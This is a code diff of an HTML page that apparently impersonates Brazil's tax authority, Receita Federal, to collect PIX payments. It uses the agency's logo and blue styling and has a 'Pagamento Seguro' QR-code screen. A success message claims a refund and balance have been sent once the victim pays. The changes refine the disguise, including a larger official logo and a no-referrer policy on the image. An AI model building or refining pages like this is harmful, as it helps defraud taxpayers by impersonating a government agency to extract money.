@@ -8,7 +8,7 @@
     
     <style>
         :root {
-            --primary: #0038a9; /* Azul Oficial Receita */
+            --receita-blue: #0038a9; /* Azul Oficial da imagem */
             --green: #28a745;
             --bg-gray: #f8f9fa;
             --border: #e9ecef;
@@ -27,37 +27,23 @@
             flex-direction: column;
         }
 
-        /* HEADER AZUL DA RECEITA */
+        /* HEADER LIMPO (APENAS LOGO) */
         .app-header {
-            background: var(--primary); /* Fundo Azul da imagem enviada */
-            padding: 18px 20px;
+            background-color: var(--receita-blue);
+            padding: 20px;
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            justify-content: center; /* Centraliza o logo */
+            box-shadow: 0 4px 12px rgba(0, 56, 169, 0.25);
             position: sticky;
             top: 0;
-            z-index: 10;
-            box-shadow: 0 4px 10px rgba(0, 56, 169, 0.2);
+            z-index: 100;
         }
         
         .logo-receita {
-            height: 32px;
-            filter: brightness(0) invert(1); /* Torna o logo branco */
+            height: 42px; /* Logo maior e visível */
+            filter: brightness(0) invert(1); /* Deixa o logo 100% branco */
             display: block;
-        }
-
-        .secure-tag { 
-            background: rgba(255,255,255,0.2); 
-            color: #fff; 
-            padding: 4px 10px; 
-            border-radius: 4px; 
-            font-size: 10px; 
-            font-weight: 600; 
-            display: flex; 
-            align-items: center; 
-            gap: 4px; 
-            text-transform: uppercase; 
-            letter-spacing: 0.5px;
         }
 
         /* CORPO */
@@ -134,7 +120,7 @@
             -webkit-appearance: none;
             transition: 0.3s;
         }
-        .input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(0, 56, 169, 0.1); }
+        .input:focus { border-color: var(--receita-blue); box-shadow: 0 0 0 3px rgba(0, 56, 169, 0.1); }
 
         /* BOTÃO */
         .btn-main {
@@ -151,7 +137,8 @@
             margin-top: 10px;
             cursor: pointer;
         }
-        
+        .btn-main:active { transform: scale(0.98); }
+
         .footer-info { text-align: center; margin-top: 25px; color: #adb5bd; font-size: 11px; }
 
         /* MODAL */
@@ -164,11 +151,10 @@
 <body>
 
     <div class="app-header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" alt="Receita Federal" class="logo-receita">
-        <div class="secure-tag">
-            <svg width="10" height="10" fill="currentColor" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/><path d="M10.97 4.97a.235.235 0 0 0-.02.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05z"/></svg>
-            Ambiente Seguro
-        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" 
+             alt="Receita Federal" 
+             class="logo-receita"
+             referrerpolicy="no-referrer">
     </div>
 
     <div class="content">
@@ -226,12 +212,9 @@
     <div id="qr-screen">
         <h3 class="qr-title">Pagamento Seguro</h3>
         <p style="text-align:center; color:#666; font-size:14px;">Use o app do seu banco para pagar.</p>
-        
         <img id="qr-image" class="qr-img">
         <div id="pix-copia" class="pix-code"></div>
-        
         <button class="btn-main" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
-        
         <div id="msg-sucesso" style="margin-top:25px; text-align:center; display:none;">
             <div style="color:#28a745; font-weight:800; font-size:18px; margin-bottom:5px;">PAGAMENTO RECEBIDO!</div>
             <div style="font-size:13px; color:#555;">Seu estorno e o saldo foram enviados.</div>
